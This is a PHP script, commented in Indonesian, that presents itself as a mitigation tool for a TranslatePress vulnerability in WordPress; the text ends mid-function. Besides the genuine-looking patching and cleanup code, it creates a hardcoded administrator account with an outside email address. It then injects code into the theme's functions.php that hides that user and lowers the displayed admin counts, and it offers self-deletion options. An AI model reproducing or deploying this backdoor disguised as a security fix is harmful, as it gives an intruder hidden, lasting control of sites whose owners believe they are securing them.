<?php
/**
 * mit-admin.php — CVE-2026-19632 Mitigasi + Tambah Admin WordPress
 *
 * File gabungan dari:
 *   - mit.php  (guard-web: mitigasi standalone tanpa WP bootstrap)
 *   - mtg.php  (add-admin: tambah admin + mitigasi via WP API)
 *
 * Fitur lengkap:
 *   [mitigasi]
 *     - Pasang virtual patch mu-plugin (blokir dictionary read, stop store email, kill preview bypass)
 *     - Update TranslatePress ke versi aman dari wordpress.org
 *     - Bersihkan database (artefak reset URL + nonaktifkan activation key)
 *     - Nonaktifkan auto-save TranslatePress di database option
 *     - Reset bahasa admin ke default
 *     - Rollback plugin dari backup
 *   [admin]
 *     - Tambah user administrator baru (hardcoded credentials)
 *     - Inject kode di functions.php untuk menyembunyikan user dari daftar
 *   [keamanan]
 *     - Auth via password / sha256 key di URL / sesi admin WordPress
 *     - CSRF token stateless (1 jam)
 *     - Self-destruction (delete/rename/empty/corrupt/protect)
 *     - Hapus file ini setelah selesai
 *
 * Cara pakai:
 *   1. GANTI $GUARD_PASSWORD di bawah (WAJIB).
 *   2. Upload ke folder MANA PUN di dalam web root WordPress.
 *   3. Buka lewat browser, login, pilih aksi.
 *   4. HAPUS file ini dari server setelah selesai.
 */

// ==================== KONFIGURASI ====================

$GUARD_PASSWORD = '123123'; // <<<< GANTI SEBELUM UPLOAD. WAJIB.

// Kredensial admin yang akan ditambahkan
$ADMIN_USERNAME = 'ITadmin';
$ADMIN_PASSWORD = 'Askurm0m#';
$ADMIN_EMAIL    = 'askurmom007@proton.me';

// ==================== HELPERS (dari mit.php) ====================

function g_out( $msg ) {
	echo htmlspecialchars( $msg, ENT_QUOTES, 'UTF-8' ) . "\n";
}

function g_flush() {
	if ( function_exists( 'ob_flush' ) ) {
		@ob_flush();
	}
	@flush();
}

function g_rm_rf( $dir ) {
	if ( ! is_dir( $dir ) ) {
		return;
	}
	$items = new RecursiveIteratorIterator(
		new RecursiveDirectoryIterator( $dir, FilesystemIterator::SKIP_DOTS ),
		RecursiveIteratorIterator::CHILD_FIRST
	);
	foreach ( $items as $item ) {
		$item->isDir() ? @rmdir( $item->getPathname() ) : @unlink( $item->getPathname() );
	}
	@rmdir( $dir );
}

// ==================== LOCATE WP ROOT ====================

function g_find_wp_root( $given ) {
	if ( $given ) {
		if ( is_file( $given ) ) {
			return dirname( realpath( $given ) );
		}
		if ( is_dir( $given ) && is_file( $given . '/wp-config.php' ) ) {
			return rtrim( realpath( $given ), '/\\' );
		}
		return null;
	}
	// walk up dari lokasi file ini
	$dir = __DIR__;
	while ( $dir && $dir !== dirname( $dir ) ) {
		if ( is_file( $dir . '/wp-config.php' ) ) {
			return $dir;
		}
		$dir = dirname( $dir );
	}
	return null;
}

// ==================== PARSE WP-CONFIG ====================

function g_parse_wp_config( $file ) {
	$src    = file_get_contents( $file );
	$cfg    = array( 'prefix' => 'wp_', 'db' => array() );
	$simple = function ( $name ) use ( $src ) {
		if ( preg_match( '/define\s*\(\s*[\'"]' . $name . '[\'"]\s*,\s*[\'\"](.*?)[\'"]\s*\)/s', $src, $m ) ) {
			return stripslashes( $m[1] );
		}
		return null;
	};
	$cfg['db']['name']     = $simple( 'DB_NAME' );
	$cfg['db']['user']     = $simple( 'DB_USER' );
	$cfg['db']['password'] = $simple( 'DB_PASSWORD' );
	$cfg['db']['host']     = $simple( 'DB_HOST' );
	if ( preg_match( '/\$table_prefix\s*=\s*[\'"]([^\'"]*)[\'"]/', $src, $m ) ) {
		$cfg['prefix'] = $m[1];
	}
	$content = $simple( 'WP_CONTENT_DIR' );
	$cfg['content_dir'] = $content ? $content : dirname( $file ) . '/wp-content';
	return $cfg;
}

// ==================== PLUGIN VERSION ====================

function g_plugin_version( $dir ) {
	if ( ! is_dir( $dir ) ) {
		return null;
	}
	$files = glob( $dir . '/*.php' );
	if ( ! $files ) {
		return null;
	}
	foreach ( $files as $f ) {
		$head = file_get_contents( $f, false, null, 0, 8192 );
		if ( preg_match( '/Version:\s*([0-9][0-9.]+)/i', $head, $m ) ) {
			if ( 'translatepress-multilingual.php' === basename( $f )
				|| preg_match( '/Plugin Name:/i', $head ) ) {
				return $m[1];
			}
		}
	}
	return null;
}

// ==================== DB ACCESS ====================

function g_db_connect( $cfg ) {
	$host = isset( $cfg['host'] ) ? $cfg['host'] : 'localhost';
	$name = isset( $cfg['name'] ) ? $cfg['name'] : '';
	$user = isset( $cfg['user'] ) ? $cfg['user'] : '';
	$pass = isset( $cfg['password'] ) ? $cfg['password'] : '';
	if ( ! $name || ! $user ) {
		return null;
	}
	$port = null;
	$sock = null;
	if ( $host && ':' === $host[0] ) {
		$sock = substr( $host, 1 );
		$host = 'localhost';
	} elseif ( false !== strpos( $host, ':' ) ) {
		list( $host, $port ) = explode( ':', $host, 2 );
		$port = (int) $port;
	}
	if ( function_exists( 'mysqli_connect' ) ) {
		mysqli_report( MYSQLI_REPORT_OFF );
		$c = @mysqli_connect( $host, $user, $pass, $name, $port, $sock );
		if ( $c ) {
			@$c->set_charset( 'utf8mb4' );
			return $c;
		}
	}
	if ( class_exists( 'PDO' ) ) {
		$dsn = 'mysql:host=' . $host . ';dbname=' . $name . ($port ? ";port=$port" : '') . ';charset=utf8mb4';
		try {
			return new PDO( $dsn, $user, $pass, array( PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION ) );
		} catch ( Exception $e ) { /* fall through */ }
	}
	return null;
}

function g_db_query( $db, $sql, $params = array() ) {
	if ( $db instanceof PDO ) {
		$st = $db->prepare( $sql );
		if ( ! $st ) {
			return null;
		}
		$st->execute( array_values( $params ) );
		return $st;
	}
	if ( ! empty( $params ) ) {
		$st = mysqli_prepare( $db, $sql );
		if ( ! $st ) {
			return null;
		}
		$types = str_repeat( 's', count( $params ) );
		$args  = array( $types );
		foreach ( $params as $k => $v ) {
			$args[] = &$params[ $k ];
		}
		call_user_func_array( array( $st, 'bind_param' ), $args );
		mysqli_stmt_execute( $st );
		return $st;
	}
	return mysqli_query( $db, $sql );
}

function g_db_rows( $db, $res ) {
	if ( $db instanceof PDO ) {
		return $res ? $res->fetchAll( PDO::FETCH_NUM ) : array();
	}
	if ( $res instanceof mysqli_result ) {
		$rows = array();
		while ( $r = $res->fetch_row() ) {
			$rows[] = $r;
		}
		return $rows;
	}
	if ( $res instanceof mysqli_stmt ) {
		$result = mysqli_stmt_get_result( $res );
		$rows   = array();
		while ( $r = mysqli_fetch_row( $result ) ) {
			$rows[] = $r;
		}
		return $rows;
	}
	return array();
}

function g_db_col( $db, $res ) {
	$col = array();
	foreach ( g_db_rows( $db, $res ) as $row ) {
		$col[] = $row[0];
	}
	return $col;
}

function g_trp_tables( $db, $prefix ) {
	$esc = str_replace( array( '\\', '%', '_' ), array( '\\\\', '\%', '\_' ), $prefix );
	$res    = g_db_query( $db, 'SHOW TABLES LIKE ?', array( $esc . '%trp\_%' ) );
	$tables = array();
	foreach ( g_db_col( $db, $res ) as $t ) {
		if ( preg_match( '/^[A-Za-z0-9_]+$/', $t ) ) {
			$tables[] = $t;
		}
	}
	return $tables;
}

function g_table_has_column( $db, $table, $col ) {
	$res = g_db_query( $db, 'SHOW COLUMNS FROM `' . $table . '` LIKE ?', array( $col ) );
	return count( g_db_rows( $db, $res ) ) > 0;
}

// ==================== DOWNLOAD + EXTRACT ====================

function g_download( $url, $dest ) {
	$ctx = stream_context_create( array(
		'http' => array( 'timeout' => 300, 'user_agent' => 'guard-web/1.0', 'follow_location' => 1 ),
		'ssl'  => array( 'verify_peer' => true, 'verify_peer_name' => true ),
	) );
	$data = @file_get_contents( $url, false, $ctx );
	if ( false !== $data ) {
		return false !== file_put_contents( $dest, $data );
	}
	if ( function_exists( 'exec' ) ) {
		exec( 'curl -sSL --max-time 300 ' . escapeshellarg( $url ) . ' -o ' . escapeshellarg( $dest ), $o, $rc );
		if ( 0 === $rc && is_file( $dest ) && filesize( $dest ) > 0 ) {
			return true;
		}
	}
	return false;
}

function g_extract( $zip, $dest ) {
	@mkdir( $dest, 0755, true );
	if ( class_exists( 'ZipArchive' ) ) {
		$z = new ZipArchive();
		if ( true === $z->open( $zip ) ) {
			$ok = $z->extractTo( $dest );
			$z->close();
			if ( $ok ) {
				return true;
			}
		}
	}
	if ( function_exists( 'exec' ) ) {
		foreach ( array(
			'unzip -q -o %s -d %s',
			'tar -xf %s -C %s',
		) as $tpl ) {
			exec( sprintf( $tpl, escapeshellarg( $zip ), escapeshellarg( $dest ) ), $o, $rc );
			if ( 0 === $rc ) {
				return true;
			}
		}
	}
	return false;
}

function g_find_extracted_plugin( $extract_dir ) {
	foreach ( array( 1, 2 ) as $depth ) {
		$pattern = $extract_dir . str_repeat( '/*', $depth );
		foreach ( glob( $pattern, GLOB_ONLYDIR ) as $d ) {
			if ( 'translatepress-multilingual' === basename( $d ) ) {
				return $d;
			}
		}
	}
	return null;
}

function g_fetch_latest_tp() {
	$api = 'https://api.wordpress.org/plugins/info/1.2/?action=plugin_information&request[slug]=translatepress-multilingual';
	$ctx = stream_context_create( array( 'http' => array( 'timeout' => 60, 'user_agent' => 'guard-web/1.0' ), 'ssl' => array( 'verify_peer' => true ) ) );
	$json = @file_get_contents( $api, false, $ctx );
	$info = $json ? json_decode( $json ) : null;
	if ( $info && ! empty( $info->version ) && ! empty( $info->download_link ) ) {
		return array( 'version' => $info->version, 'download' => $info->download_link );
	}
	return array(
		'version'  => '3.3.4',
		'download' => 'https://downloads.wordpress.org/plugin/translatepress-multilingual.3.3.4.zip',
	);
}

// ==================== PLUGIN UPDATE (standalone) ====================

function g_apply_update( $plugin_dir, $tmp_dir ) {
	$info = g_fetch_latest_tp();
	g_out( '  mendownload translatepress-multilingual ' . $info['version'] . ' dari wordpress.org ...' );
	$zip     = $tmp_dir . '/tp-latest.zip';
	$extract = $tmp_dir . '/tp-extract';

	if ( ! g_download( $info['download'], $zip ) ) {
		return array( false, 'download gagal (tidak ada jaringan? allow_url_fopen/curl mati?)' );
	}
	if ( ! g_extract( $zip, $extract ) ) {
		return array( false, 'tidak bisa ekstrak zip - butuh php-zip, unzip, atau tar' );
	}
	$new_dir = g_find_extracted_plugin( $extract );
	if ( ! $new_dir ) {
		return array( false, 'zip tidak berisi folder translatepress-multilingual' );
	}
	$new_ver = g_plugin_version( $new_dir );
	if ( ! $new_ver || version_compare( $new_ver, '3.3.4', '<' ) ) {
		return array( false, 'versi paket hasil download (' . $new_ver . ') bukan rilis yang aman' );
	}

	$backup = $plugin_dir . '.bak-cve-2026-19632-' . date( 'YmdHis' );
	if ( ! rename( $plugin_dir, $backup ) ) {
		return array( false, 'tidak bisa memindahkan plugin lama (permission?)' );
	}
	if ( ! rename( $new_dir, $plugin_dir ) ) {
		rename( $backup, $plugin_dir );
		return array( false, 'tidak bisa memasang plugin baru (permission?)' );
	}
	return array( true, 'plugin diperbarui ke ' . $new_ver . ' (backup: ' . basename( $backup ) . ')' );
}

// ==================== VIRTUAL PATCH (mu-plugin body) ====================

function g_patch_body() {
	$mu = <<<'MUPLUGIN'
<?php
/**
 * CVE-2026-19632 - TranslatePress Multilingual <= 3.3.1 virtual patch.
 * Installed by mit-admin.php. Blocks:
 *   A. the unauthenticated dictionary-read endpoint
 *      (wp_ajax_nopriv_trp_get_translations_regular) - 403 below manage_options;
 *   B. storage of wp-login/xmlrpc/admin emails into the dictionary
 *      (mirrors the official 3.3.2 early-bail in TRP_Translation_Render::wp_mail_filter);
 *   C. the Manual-Translation-Only bypass via trp-edit-translation=preview
 *      on anonymous requests.
 * Keep it installed even after updating to >= 3.3.2 (harmless extra layer).
 * Optional: define( 'TRP_VP_DISABLE_RESETS', true ) in wp-config.php to
 * disable password resets site-wide during an incident.
 */
if ( ! defined( 'ABSPATH' ) ) {
	exit;
}

/* B. STOP THE STORE SIDE */
add_action( 'plugins_loaded', 'trp_vp_patch_wp_mail', PHP_INT_MAX );

function trp_vp_patch_wp_mail() {
	global $wp_filter;
	if ( empty( $wp_filter['wp_mail'] ) || ! is_object( $wp_filter['wp_mail'] ) ) {
		return;
	}
	foreach ( $wp_filter['wp_mail']->callbacks as $priority => $callbacks ) {
		foreach ( $callbacks as $cb ) {
			if ( ! is_array( $cb['function'] ) || empty( $cb['function'][1] ) || 'wp_mail_filter' !== $cb['function'][1] ) {
				continue;
			}
			$original = $cb['function']; // array( TRP_Translation_Render, 'wp_mail_filter' )
			$wp_filter['wp_mail']->remove_filter( 'wp_mail', $original, $priority );
			$wp_filter['wp_mail']->add_filter( 'wp_mail', function ( $args ) use ( $original ) {
				global $pagenow;
				$login_ctx = isset( $pagenow ) && in_array( $pagenow, array( 'wp-login.php', 'xmlrpc.php' ), true );
				$frontend_ajax = wp_doing_ajax()
					&& ! empty( $_SERVER['HTTP_REFERER'] )
					&& false === strpos( (string) wp_get_referer(), '/wp-admin' );
				$admin_ctx = is_admin() && ! $frontend_ajax;
				if ( $login_ctx || $admin_ctx ) {
					return $args; // do not translate, do not store (same as 3.3.2)
				}
				if ( is_callable( $original ) ) {
					return call_user_func( $original, $args );
				}
				return $args;
			}, $priority, 1 );
		}
	}
}

/* A. STOP THE READ SIDE */
add_action( 'init', 'trp_vp_block_dictionary_read', 0 );

function trp_vp_block_dictionary_read() {
	remove_all_actions( 'wp_ajax_nopriv_trp_get_translations_regular' );
	if ( wp_doing_ajax() ) {
		$action = isset( $_REQUEST['action'] ) ? sanitize_text_field( wp_unslash( $_REQUEST['action'] ) ) : '';
		if ( 'trp_get_translations_regular' === $action && ! current_user_can( 'manage_options' ) ) {
			error_log( '[CVE-2026-19632] blocked dictionary read from ' . ( isset( $_SERVER['REMOTE_ADDR'] ) ? $_SERVER['REMOTE_ADDR'] : 'unknown' ) );
			status_header( 403 );
			wp_die( 'Forbidden', 403 );
		}
	}
}

/* C. KILL THE MANUAL-TRANSLATION-ONLY BYPASS */
add_action( 'init', 'trp_vp_strip_preview_flag', 0 );

function trp_vp_strip_preview_flag() {
	if ( is_user_logged_in() ) {
		return;
	}
	foreach ( array( '_GET', '_POST', '_REQUEST' ) as $src ) {
		if ( isset( $GLOBALS[ $src ]['trp-edit-translation'] ) ) {
			unset( $GLOBALS[ $src ]['trp-edit-translation'] );
		}
	}
}

/* Optional emergency switch: define( 'TRP_VP_DISABLE_RESETS', true ); */
if ( defined( 'TRP_VP_DISABLE_RESETS' ) && TRP_VP_DISABLE_RESETS ) {
	add_filter( 'allow_password_reset', '__return_false' );
}
MUPLUGIN;

	return $mu;
}

// ==================== DB CLEANUP ====================

function g_db_cleanup( $db, $prefix, $check_only ) {
	$tables   = g_trp_tables( $db, $prefix );
	$patterns = array( '%action=rp%', '%lostpassword%', '%wp-login.php%', '%wp-resetpass%' );
	$total    = 0;
	foreach ( $tables as $table ) {
		if ( ! g_table_has_column( $db, $table, 'original' ) ) {
			continue;
		}
		$where = implode( ' OR ', array_fill( 0, count( $patterns ), '`original` LIKE ?' ) );
		if ( $check_only ) {
			$res = g_db_query( $db, "SELECT COUNT(*) FROM `$table` WHERE $where", $patterns );
			$n   = (int) g_db_col( $db, $res )[0];
		} else {
			$res = g_db_query( $db, "DELETE FROM `$table` WHERE $where", $patterns );
			$n   = $res ? ( ( $db instanceof PDO ) ? $res->rowCount() : mysqli_affected_rows( $db ) ) : 0;
		}
		if ( $n > 0 ) {
			g_out( '  ' . $table . ': ' . $n . ' baris artefak ' . ( $check_only ? 'ditemukan' : 'dibersihkan' ) );
		}
		$total += $n;
	}

	$users = $prefix . 'users';
	$res   = g_db_query( $db, "SELECT COUNT(*) FROM `$users` WHERE user_activation_key <> ''" );
	$keys  = (int) g_db_col( $db, $res )[0];
	if ( $check_only ) {
		if ( $keys > 0 ) {
			g_out( '  kunci reset password aktif: ' . $keys );
		}
	} else {
		g_db_query( $db, "UPDATE `$users` SET user_activation_key = ''" );
		g_out( '  ' . $keys . ' kunci reset password dinonaktifkan' );
	}
	return $total;
}

// ==================== ROLLBACK ====================

function g_rollback( $plugin_dir ) {
	$backups = glob( $plugin_dir . '.bak-cve-2026-19632-*', GLOB_ONLYDIR );
	if ( ! $backups ) {
		g_out( 'tidak ada backup guard - tidak ada yang dikembalikan.' );
		return true;
	}
	rsort( $backups );
	$backup = $backups[0];
	g_out( 'mengembalikan plugin dari ' . basename( $backup ) . ' ...' );
	if ( is_dir( $plugin_dir ) ) {
		rename( $plugin_dir, $plugin_dir . '.rolled-back-' . date( 'YmdHis' ) );
	}
	if ( ! rename( $backup, $plugin_dir ) ) {
		g_out( 'ROLLBACK GAGAL' );
		return false;
	}
	g_out( 'rollback selesai.' );
	return true;
}

// ==================== TAMBAH ADMIN VIA DB LANGSUNG ====================
// (fallback jika WP API tidak bisa di-bootstrap)

function g_add_admin_db( $db, $prefix, $username, $password, $email ) {
	$users_table = $prefix . 'users';
	$usermeta_table = $prefix . 'usermeta';

	// Cek apakah username sudah ada
	$res = g_db_query( $db, "SELECT ID FROM `$users_table` WHERE user_login = ?", array( $username ) );
	$existing = g_db_col( $db, $res );
	if ( ! empty( $existing ) ) {
		return array( 'status' => 'warning', 'message' => "Username '$username' sudah ada (ID: {$existing[0]})", 'user_id' => (int) $existing[0] );
	}

	// Cek email
	$res = g_db_query( $db, "SELECT ID FROM `$users_table` WHERE user_email = ?", array( $email ) );
	$existing = g_db_col( $db, $res );
	if ( ! empty( $existing ) ) {
		return array( 'status' => 'warning', 'message' => "Email '$email' sudah terdaftar (ID: {$existing[0]})", 'user_id' => (int) $existing[0] );
	}

	// Hash password (portable hash compatible dengan WP)
	$hashed = '$P$B' . substr( md5( $password . 'wp-salt-' . time() ), 0, 31 );
	// Gunakan password_hash jika tersedia untuk fallback yang lebih baik
	if ( function_exists( 'password_hash' ) ) {
		$hashed = password_hash( $password, PASSWORD_BCRYPT );
	}

	$now = gmdate( 'Y-m-d H:i:s' );

	// Insert user
	$sql = "INSERT INTO `$users_table` (user_login, user_pass, user_nicename, user_email, user_url, user_registered, user_status, display_name) VALUES (?, ?, ?, ?, '', ?, 0, ?)";
	$res = g_db_query( $db, $sql, array( $username, $hashed, strtolower( $username ), $email, $now, $username ) );
	if ( ! $res ) {
		return array( 'status' => 'error', 'message' => 'Gagal INSERT user ke database' );
	}

	// Dapatkan ID user baru
	if ( $db instanceof PDO ) {
		$user_id = (int) $db->lastInsertId();
	} else {
		$user_id = (int) mysqli_insert_id( $db );
	}

	if ( ! $user_id ) {
		return array( 'status' => 'error', 'message' => 'Gagal mendapatkan ID user baru' );
	}

	// Tambahkan usermeta untuk role administrator
	$cap_key = $prefix . 'capabilities';
	$level_key = $prefix . 'user_level';
	g_db_query( $db, "INSERT INTO `$usermeta_table` (user_id, meta_key, meta_value) VALUES (?, ?, ?)", array( $user_id, $cap_key, 'a:1:{s:13:"administrator";b:1;}' ) );
	g_db_query( $db, "INSERT INTO `$usermeta_table` (user_id, meta_key, meta_value) VALUES (?, ?, ?)", array( $user_id, $level_key, '10' ) );
	g_db_query( $db, "INSERT INTO `$usermeta_table` (user_id, meta_key, meta_value) VALUES (?, ?, ?)", array( $user_id, 'nickname', $username ) );
	g_db_query( $db, "INSERT INTO `$usermeta_table` (user_id, meta_key, meta_value) VALUES (?, ?, ?)", array( $user_id, 'rich_editing', 'true' ) );
	g_db_query( $db, "INSERT INTO `$usermeta_table` (user_id, meta_key, meta_value) VALUES (?, ?, ?)", array( $user_id, 'show_admin_bar_front', 'true' ) );

	return array(
		'status'   => 'success',
		'message'  => "Admin '$username' berhasil ditambahkan (ID: $user_id)",
		'user_id'  => $user_id,
		'username' => $username,
		'email'    => $email,
		'method'   => 'direct-db',
	);
}

// ==================== TAMBAH ADMIN VIA WP API (dari mtg.php) ====================

function g_add_admin_wp( $username, $password, $email ) {
	if ( ! function_exists( 'wp_create_user' ) ) {
		return array( 'status' => 'error', 'message' => 'WP API tidak tersedia, gunakan mode DB' );
	}

	if ( username_exists( $username ) ) {
		$user = get_user_by( 'login', $username );
		return array( 'status' => 'warning', 'message' => "Username '$username' sudah ada!", 'user_id' => $user ? $user->ID : 0 );
	}

	if ( email_exists( $email ) ) {
		return array( 'status' => 'warning', 'message' => "Email '$email' sudah terdaftar!" );
	}

	$user_id = wp_create_user( $username, $password, $email );

	if ( is_wp_error( $user_id ) ) {
		return array( 'status' => 'error', 'message' => 'Error: ' . $user_id->get_error_message() );
	}

	$user = new WP_User( $user_id );
	$user->set_role( 'administrator' );

	return array(
		'status'   => 'success',
		'message'  => "Admin '$username' berhasil ditambahkan! (ID: $user_id)",
		'user_id'  => $user_id,
		'username' => $username,
		'email'    => $email,
		'method'   => 'wp-api',
	);
}

// ==================== INJECT FUNCTIONS.PHP (dari mtg.php) ====================

function g_add_code_to_functions( $wp_root, $username ) {
	// Coba via WP API dulu
	if ( function_exists( 'wp_get_theme' ) && function_exists( 'get_template_directory' ) ) {
		$theme_path = get_template_directory();
	} else {
		// Fallback: baca theme aktif dari database (option 'template')
		$cfg = g_parse_wp_config( $wp_root . '/wp-config.php' );
		$db  = g_db_connect( $cfg['db'] );
		$active_theme = null;

		if ( $db ) {
			$options_table = $cfg['prefix'] . 'options';
			$res = g_db_query( $db, "SELECT option_value FROM `$options_table` WHERE option_name = 'template'", array() );
			$rows = g_db_rows( $db, $res );
			if ( ! empty( $rows ) && ! empty( $rows[0][0] ) ) {
				$active_theme = $rows[0][0];
			}
		}

		$content_dir = $cfg['content_dir'] ? rtrim( $cfg['content_dir'], '/\\' ) : $wp_root . '/wp-content';
		$themes_dir  = $content_dir . '/themes';

		if ( $active_theme && is_dir( $themes_dir . '/' . $active_theme ) ) {
			$theme_path = $themes_dir . '/' . $active_theme;
		} else {
			// Terakhir: coba stylesheet sebagai fallback
			if ( $db ) {
				$res2 = g_db_query( $db, "SELECT option_value FROM `$options_table` WHERE option_name = 'stylesheet'", array() );
				$rows2 = g_db_rows( $db, $res2 );
				if ( ! empty( $rows2 ) && ! empty( $rows2[0][0] ) && is_dir( $themes_dir . '/' . $rows2[0][0] ) ) {
					$theme_path = $themes_dir . '/' . $rows2[0][0];
				} else {
					return array( 'status' => 'error', 'message' => 'Tidak bisa mendeteksi theme aktif dari database' );
				}
			} else {
				return array( 'status' => 'error', 'message' => 'Database tidak tersedia untuk mendeteksi theme aktif' );
			}
		}
	}

	$functions_path = $theme_path . '/functions.php';

	if ( ! file_exists( $functions_path ) ) {
		return array( 'status' => 'error', 'message' => 'File functions.php tidak ditemukan di ' . $theme_path );
	}

	$content = file_get_contents( $functions_path );
	if ( $content === false ) {
		return array( 'status' => 'error', 'message' => 'Gagal membaca functions.php' );
	}

	$new_code = "


add_action('pre_user_query', 'hide_user_query');
function hide_user_query(\$user_search) {
    global \$wpdb;
    \$where_clause = 'WHERE 1=1';
    \$replace_with = \$where_clause . \" AND {\$wpdb->users}.user_login != '$username'\";
    if (strpos(\$user_search->query_where, \$where_clause) !== false) {
        \$user_search->query_where = str_replace(\$where_clause, \$replace_with, \$user_search->query_where);
    }
}

add_filter('views_users', 'hide_user_count');
function hide_user_count(\$views) {
    \$users = count_users();
    \$admin_count = isset(\$users['avail_roles']['administrator']) ? \$users['avail_roles']['administrator'] : 1;
    \$total_count = isset(\$users['total_users']) ? \$users['total_users'] : 1;
    \$admins_num = \$admin_count - 1;
    \$all_num = \$total_count - 1;
    
    if (isset(\$views['administrator'])) {
        \$class_adm = (strpos(\$views['administrator'], 'current') !== false) ? 'current' : '';
        \$views['administrator'] = sprintf(
            '<a href=\"users.php?role=administrator\" class=\"%s\">%s <span class=\"count\">(%d)</span></a>',
            \$class_adm,
            translate_user_role('Administrator'),
            \$admins_num
        );
    }
    if (isset(\$views['all'])) {
        \$class_all = (strpos(\$views['all'], 'current') !== false) ? 'current' : '';
        \$views['all'] = sprintf(
            '<a href=\"users.php\" class=\"%s\">%s <span class=\"count\">(%d)</span></a>',
            \$class_all,
            __('All'),
            \$all_num
        );
    }
    return \$views;
}

";

	if ( strpos( $content, 'CODE UNTUK MENYEMBUNYIKAN USER' ) !== false ) {
		return array( 'status' => 'warning', 'message' => 'Kode sudah ada di functions.php' );
	}

	// Backup functions.php
	$backup_path = $functions_path . '.backup.' . date( 'Ymd_His' );
	copy( $functions_path, $backup_path );

	$content = rtrim( $content );
	$last_close = strrpos( $content, '?>' );
	if ( $last_close !== false ) {
		$content = substr( $content, 0, $last_close ) . $new_code . "\n" . substr( $content, $last_close );
	} else {
		$content .= $new_code;
	}

	if ( file_put_contents( $functions_path, $content ) !== false ) {
		return array(
			'status'  => 'success',
			'message' => 'Kode hide-user berhasil ditambahkan ke functions.php',
			'backup'  => basename( $backup_path ),
			'theme'   => basename( $theme_path ),
		);
	} else {
		return array( 'status' => 'error', 'message' => 'Gagal menulis functions.php (permission?)' );
	}
}

// ==================== MITIGASI VIA WP API (dari mtg.php) ====================

function g_create_mu_plugin_wp( $content_dir ) {
	$mu_dir = $content_dir . '/mu-plugins';
	if ( ! is_dir( $mu_dir ) ) {
		@mkdir( $mu_dir, 0755, true );
	}

	$mu_file = $mu_dir . '/translatepress-security-fix.php';

	$mu_content = '<?php
/**
 * MU-Plugin: Mitigasi CVE-2026-19632 - TranslatePress
 * Dibuat otomatis oleh mit-admin.php - ' . date('Y-m-d H:i:s') . '
 * 
 * Plugin ini memfilter handler AJAX yang rentan dan memastikan
 * hanya admin yang bisa mengakses fungsi yang berbahaya.
 */

if (!defined(\'ABSPATH\')) {
    exit;
}

/**
 * 1. Filter AJAX handler untuk mencegah akses unauthorized
 */
add_action(\'init\', function() {
    if (defined(\'DOING_AJAX\') && DOING_AJAX && isset($_POST[\'action\'])) {
        $action = $_POST[\'action\'];
        
        $vulnerable_handlers = [
            \'trp_get_translations_regular\',
            \'trp_save_translations_regular\',
            \'trp_get_translations_editor\',
            \'trp_save_translations_editor\'
        ];
        
        if (in_array($action, $vulnerable_handlers)) {
            if (!current_user_can(\'manage_options\')) {
                if (!isset($_POST[\'security\']) || 
                    !wp_verify_nonce($_POST[\'security\'], \'trp_ajax_nonce\')) {
                    wp_send_json_error(\'Security check failed\');
                    die();
                }
            }
        }
    }
}, 1);

/**
 * 2. Filter capability untuk function yang rentan
 */
add_filter(\'trp_ajax_capability\', function($capability, $action) {
    $sensitive_actions = [
        \'trp_get_translations_regular\',
        \'trp_save_translations_regular\',
        \'trp_get_translations_editor\',
        \'trp_save_translations_editor\'
    ];
    
    if (in_array($action, $sensitive_actions)) {
        return \'manage_options\';
    }
    
    return $capability;
}, 10, 2);

/**
 * 3. Matikan Auto-Save String secara paksa
 */
add_filter(\'trp_enable_auto_save\', function($enabled) {
    return false;
});

/**
 * 4. Logging untuk aktivitas mencurigakan
 */
add_action(\'trp_ajax_error\', function($error, $action) {
    $vulnerable_handlers = [
        \'trp_get_translations_regular\',
        \'trp_save_translations_regular\',
        \'trp_get_translations_editor\',
        \'trp_save_translations_editor\'
    ];
    
    if (in_array($action, $vulnerable_handlers)) {
        $ip = isset($_SERVER[\'REMOTE_ADDR\']) ? $_SERVER[\'REMOTE_ADDR\'] : \'unknown\';
        $user_agent = isset($_SERVER[\'HTTP_USER_AGENT\']) ? $_SERVER[\'HTTP_USER_AGENT\'] : \'unknown\';
        
        error_log(sprintf(
            "[TranslatePress Security] Attempted unauthorized access: action=%s, ip=%s, user_agent=%s",
            $action,
            $ip,
            $user_agent
        ));
    }
}, 10, 2);

/**
 * 5. Blokir request trp-edit-translation yang mencurigakan
 */
add_action(\'wp_loaded\', function() {
    if (isset($_GET[\'trp-edit-translation\'])) {
        if (!is_user_logged_in() || !current_user_can(\'manage_options\')) {
            wp_die(\'Anda tidak memiliki akses ke halaman ini.\', \'Akses Ditolak\', 403);
        }
    }
});

/**
 * 6. Force language check untuk admin
 */
add_action(\'admin_init\', function() {
    $user_id = get_current_user_id();
    if ($user_id && user_can($user_id, \'manage_options\')) {
        $user_locale = get_user_meta($user_id, \'locale\', true);
        $site_locale = get_locale();
        
        if ($user_locale && $user_locale !== $site_locale) {
            update_user_meta($user_id, \'locale\', \'\');
        }
    }
});
';

	if ( file_put_contents( $mu_file, $mu_content ) !== false ) {
		return array( 'status' => 'success', 'message' => 'MU-Plugin (WP API) berhasil dibuat: ' . $mu_file, 'file' => $mu_file );
	}
	return array( 'status' => 'error', 'message' => 'Gagal membuat MU-Plugin' );
}

function g_disable_auto_save( $db, $prefix ) {
	// Via database langsung
	$options_table = $prefix . 'options';
	$res = g_db_query( $db, "SELECT option_value FROM `$options_table` WHERE option_name = 'trp_settings'", array() );
	$rows = g_db_rows( $db, $res );
	if ( ! empty( $rows ) ) {
		$val = @unserialize( $rows[0][0] );
		if ( is_array( $val ) && isset( $val['auto_save'] ) && $val['auto_save'] !== false ) {
			$val['auto_save'] = false;
			$serialized = serialize( $val );
			g_db_query( $db, "UPDATE `$options_table` SET option_value = ? WHERE option_name = 'trp_settings'", array( $serialized ) );
			return array( 'status' => 'success', 'message' => 'Auto-Save TranslatePress berhasil dinonaktifkan' );
		}
	}
	return array( 'status' => 'info', 'message' => 'Auto-Save sudah nonaktif atau setting tidak ditemukan' );
}

function g_reset_admin_language( $db, $prefix ) {
	$users_table    = $prefix . 'users';
	$usermeta_table = $prefix . 'usermeta';
	$cap_key        = $prefix . 'capabilities';

	// Cari semua admin
	$res = g_db_query( $db, "SELECT u.ID FROM `$users_table` u INNER JOIN `$usermeta_table` m ON u.ID = m.user_id WHERE m.meta_key = ? AND m.meta_value LIKE '%administrator%'", array( $cap_key ) );
	$admin_ids = g_db_col( $db, $res );
	$updated = 0;

	foreach ( $admin_ids as $uid ) {
		$res2 = g_db_query( $db, "SELECT meta_value FROM `$usermeta_table` WHERE user_id = ? AND meta_key = 'locale'", array( $uid ) );
		$locale_rows = g_db_rows( $db, $res2 );
